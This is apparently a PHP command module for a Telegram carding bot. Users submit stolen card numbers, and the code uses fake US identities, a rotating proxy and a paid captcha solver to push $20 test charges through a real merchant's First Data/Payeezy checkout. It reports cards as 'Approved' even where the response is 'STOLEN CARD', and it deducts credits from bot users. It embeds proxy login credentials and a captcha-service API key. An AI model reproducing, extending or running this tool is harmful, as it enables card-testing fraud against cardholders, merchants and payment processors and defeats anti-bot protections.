<?php


$gatewayname="pc";
if (preg_match('/^[\/\.,\$](?:'.$gatewayname.')(?:\s+(.+))?$/i', $message, $matches)) {
//==================[Inicializacion de variables]======================//
$messages = $bot->loadPlantillas();
$gateway = "#Payeezy_AVS_CCN (".'$pc'.")";
$lang = $db->getUserLanguage($userId);
//==================[Manejo de los Usuarios]======================//
 $accessMessage = $db->verifyUserAccess($userId, $chat_id,'$'.$gatewayname);
if ($accessMessage !== null) {
$bot->callApi('sendMessage', [
    'chat_id' => $chat_id,
    'text' => $bot->translateTemplate($accessMessage, 'en', $lang),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
    ]);
    return; 
    }
//==================[Mensaje configuracion y time]======================//
$lista = $bot->getCleanList($message, $replyMessageText);
$starttim = microtime(true);
//==================[REGEX]======================//
$validationResult = $bot->validateCreditCard($lista);
if (is_string($validationResult)) {
    $editmessage = $bot->callApi('SendMessage', [
        'chat_id' => $chat_id,
        'text' => $bot->translateTemplate($validationResult, 'en', $lang),
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true

    ])
    ]);
    sleep(3);
    $bot->callApi('deleteMessage', [
        'chat_id' => $chat_id,
        'message_id' => $editmessage 
    ]);
    return;
}

$cc = $validationResult['cc'];
$mes = $validationResult['mes'];
$ano = $validationResult['ano'];
$ano1 = (strlen($ano) == 2) ? $ano : substr($ano, 2);
$cvv = $validationResult['cvv'];
$creditcard = $validationResult['creditcard'];

switch (substr($cc, 0, 1)) {
    case '3':
        $type = "Amex";
        break;
    case '5':
        $type = "MasterCard";
        break;
    case '6':
        $type = "Discover";
        break;
    default:
        $type = "Visa";
        break;
}
    //==================[Antispam]======================//
    $antispam = $db->antispamCheck($userId,$username?:$firstname);

    if($antispam != False){
        $editmessage = $bot->callApi('sendmessage',[
        'chat_id'=>$chat_id,
        'text'=>$antispam,
        'parse_mode'=>'html',
        'reply_to_message_id'=> $message_id,
        'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    
        ])
      ]);
      sleep(3);
      $bot->callApi('deleteMessage', [
          'chat_id' => $chat_id,
          'message_id' => $editmessage 
      ]);
      return;
    }
$editmessage = $bot->callApi('SendMessage', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['vSiesta_gateway'], 'en', $lang),
$gateway,
    $creditcard),
    'parse_mode' => 'html',
    'reply_to_message_id' => $message_id,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
    ])
]);
    

 //==================[Random Direcciones]======================//
    $userData = Fake::GetUser('US');

    $firstName = $userData['first_name'];
    $lastName = $userData['last_name'];
    $username1 = $userData['username'];
    $email = $userData['email'];
    $password = $userData['password'];
    $phone = $userData['phone']['format2'];
    $userAgent = $userData['userAgent'];

    $street = $userData['street'];
    $country = $userData['country'];
    $iso2 = $userData['iso2'];
    $state = $userData['state'];
    $state_id = $userData['state_id'];
    $city = $userData['city'];
    $zip = $userData['zip'];
    $lastFourDigits = substr($cc, -4);

 //==================[Bin Verificador]======================//
    $bin = substr($cc, 0, 6);
    $resultado = $bot->verificarBin($bin);

    if (!is_string($resultado)) { // Verificamos que no sea un mensaje de error
        $brand = $resultado['brand'];
        $country = $resultado['country'];
        $country_name = $resultado['country_name'];
        $country_flag = $resultado['country_flag'];
        $country_currencies = $resultado['country_currencies'];
        $bank = $resultado['bank'];
        $level = $resultado['level'];
        $type = $resultado['type'];
    } else {
        $bot->callApi('EditMessageText', [
            'chat_id' => $chat_id,
            'text' => $resultado,
            'parse_mode' => 'html',
            'message_id' => $editmessage,
         
        ]);
        exit();
    }
    
 //==================[Proxys y Cookies]======================//
 $socks5 = "x.botproxy.net:8080";
 $rotate = "pxu41762-1:gcIUVbwxWZnXT2bCRjwP";
 
 $cookie = uniqid();
 
 
 $proxies = ["METHOD" => "CUSTOM", "SERVER" => $socks5, "AUTH" => $rotate];

 //==================[Curl Request]======================//
 
 $response = CurlX::Get(
    "https://rdlens.com/pay-now",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
        'priority: u=0, i',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0'
    ],
    $cookie,
    $proxies,
   
);
sleep(rand(1, 3));
$response = CurlX::Get(
    "https://rdlens.com/pay-now",
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'priority: u=0, i',
        'referer: https://rdlens.com/',
        'upgrade-insecure-requests: 1',
        
    ],
    $cookie,
    $proxies
);
  $hash = CurlX::ParseString($response->body,'name=&quot;x_fp_hash&quot; value=&quot;','&');
$sequence = CurlX::ParseString($response->body,'name=&quot;x_fp_sequence&quot; value=&quot;','&');
echo $x_login = preg_match('/name=&quot;x_login&quot; value=&quot;(.*?)&quot;/', $response->body, $matches) ? htmlspecialchars_decode($matches[1]) : null;

sleep(rand(1, 3));
file_put_contents("hola.txt",$response->code);
$response = CurlX::Post(
    "https://checkout.globalgatewaye4.firstdata.com/pay",
    'x_login='.urlencode($x_login).'&x_show_form=PAYMENT_FORM&x_fp_sequence='.$sequence.'&x_fp_hash='.$hash.'&x_amount=&x_currency_code=USD&x_test_request=FALSE&x_relay_response=&donation_prompt=&button_code=Pay+Now+R%26D+Ophthalmics+Corporation',
    [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language: es-ES,es;q=0.9,en;q=0.8',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://rdlens.com',
        'priority: u=0, i',
        'referer: https://rdlens.com/',
        'upgrade-insecure-requests: 1',
        
    ],
    $cookie,
    $proxies,
   
);
sleep(rand(1, 3));
$solver = new CapSolver('CAP-0DC8A5669BCC3BACE0A04D2AA3C14585');

$maxRetries = 10; // Máximo de intentos
$attempts = 0; // Contador de intentos
$solved = false;

while ($attempts < $maxRetries && !$solved) {
    try {
        // Resolver el captcha
        $solution = $solver->recaptchav2('ReCaptchaV2TaskProxyLess', [
            'websiteURL' => 'https://checkout.globalgatewaye4.firstdata.com', // URL donde está implementado el captcha
            'websiteKey' => '6LfBt9wmAAAAAFlQ5-gfCfZNq4OfsDjgam-BI73y', // Clave del sitio
        ]);

        if (isset($solution['gRecaptchaResponse'])) {
            $CaptchaResponse = $solution['gRecaptchaResponse'];
            echo "Respuesta del Captcha: $CaptchaResponse\n";

            // Hacer la petición con el token reCAPTCHA
            $response = CurlX::Post(
                "https://checkout.globalgatewaye4.firstdata.com/payeezyhcoapp/transaction/v1",
                json_encode([
                    'cc_expiry' => $mes . $ano1,
                    'cardholder_name' => "ALEX TORRES",
                    'cc_number' => $cc,
                    'cvv' => "",
                    'customerEmail' => "frinkalsex6" . random_int(11111, 999999999) . "@gmail.com",
                    'paymentType' => "payNowDonateNow",
                    'transaction_type' => "00",
                    'xlogin' => $x_login,
                    'hashKey' => $hash,
                    'amount' => "20",
                    'recaptchaToken' => $CaptchaResponse,
                    'address' => ['zip' => "10080"],
                    'cvd_presence_indicator' => "9",
                ]),
                [
                    'accept: application/json, text/javascript, */*; q=0.01',
                    'accept-language: es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                    'content-type: application/json; charset=UTF-8',
                    'hcorequestsource: CloverHCO',
                    'origin: https://checkout.globalgatewaye4.firstdata.com',
                    'priority: u=1, i',
                    'x-requested-with: XMLHttpRequest'
                ],
                $cookie,
                $proxies
            );

            // Verificar el código de respuesta HTTP
            if ($response->code === 200) {
                $errormessage= "Petición exitosa: " . $response->body . "\n";
                $solved = true;
            } else {
                throw new Exception("Error HTTP {$response->code}: " . $response->body);
            }
        } else {
            throw new Exception("No se obtuvo un token válido. Respuesta completa: " . json_encode($solution));
        }
    } catch (Exception $e) {
        $attempts++;
        $errormessage=  "Intento {$attempts} fallido: " . $e->getMessage() . "\n";
        if ($attempts >= $maxRetries) {
            $errormessage=  "Se alcanzó el número máximo de reintentos.\n";
        }
    }
}

if (!$solved) {
    $errormessage=  "No se pudo resolver el captcha o realizar la solicitud después de {$maxRetries} intentos.\n";
}







 //==================[Manejo de los mensajes]======================//
 $errormessage=CurlX::ParseString($response->body,'"exact_message":"','"');
 $messagecode=CurlX::ParseString($response->body,'"bank_message":"','"');
 $code=CurlX::ParseString($response->body,'"bank_resp_code":"','"');
 $avs=CurlX::ParseString($response->body,'"avs":"','"');
if($errormessage=="null"){
 $errormessage = "There was a problem processing the request";
    file_put_contents(__DIR__ . "/../Responses/".str_replace(' ', '', trim($gateway)).".txt",$response->body);

}
 //==================[Fin time]======================//
$starttime = intval(microtime(true) - $starttim);
 //==================[Manejo del bot]======================//
 if(($messagecode=="Approved")){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "$messagecode $code
Code: $errormessage Avs: $avs",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);

 }
 elseif($messagecode=="Insufficient Funds"){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            "$messagecode $code
Code: $errormessage Avs: $avs ",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage=="ERROR: ((6)) DECLINED: INCORRECT CVV  Please try again or contact us for assistance."){
    $response = $db->deductCredits($userId, 5);

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved", "en", $lang)." CCN✅",
            "SUCCESS
Code: 002115 AVS: R",
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV (C2 : CVV2 DECLINED)"){
    
    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "ERROR: ((6)) DECLINED: STOLEN CARD Please try again or contact us for assistance."){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Approved!✅", "en", $lang),
           $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code avs_and_cvv: Gateway Rejected: avs_and_cvv"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "Status code 2010: Card Issuer Declined CVV"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText(  "Approved!✅", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 elseif($errormessage == "There was a problem processing the request"){

    $bot->callApi('EditMessageText', [
        'chat_id' => $chat_id,
        'text' => sprintf(
            $bot->translateTemplate($messages['gateway'], 'en', $lang),
            $gateway,
            $creditcard,
            $bot->translateText("Declined!❌", "en", $lang),
            $errormessage,
            "$type - $level",
            $bank,
            "$country_name$country_flag",
            $starttime,
            $username ?: $firstname
        ),
        'parse_mode' => 'html',
        'message_id' => $editmessage,
        'reply_markup' => json_encode([
            'inline_keyboard' => $messages['buttons_gateways'],
            'resize_keyboard' => true
        ])
    ]);
 }
 else{
$bot->callApi('EditMessageText', [
    'chat_id' => $chat_id,
    'text' => sprintf(
        $bot->translateTemplate($messages['gateway'], 'en', $lang),
        $gateway,
        $creditcard,
        $bot->translateText("Declined!❌", "en", $lang),
        "$messagecode $code
Code: $errormessage Avs: $avs ",
        "$type - $level",
        $bank,
        "$country_name$country_flag",
        $starttime,
        $username ?: $firstname
    ),
    'parse_mode' => 'html',
    'message_id' => $editmessage,
    'reply_markup' => json_encode([
        'inline_keyboard' => $messages['buttons_gateways'],
        'resize_keyboard' => true
 
        ])
    ]);
}}
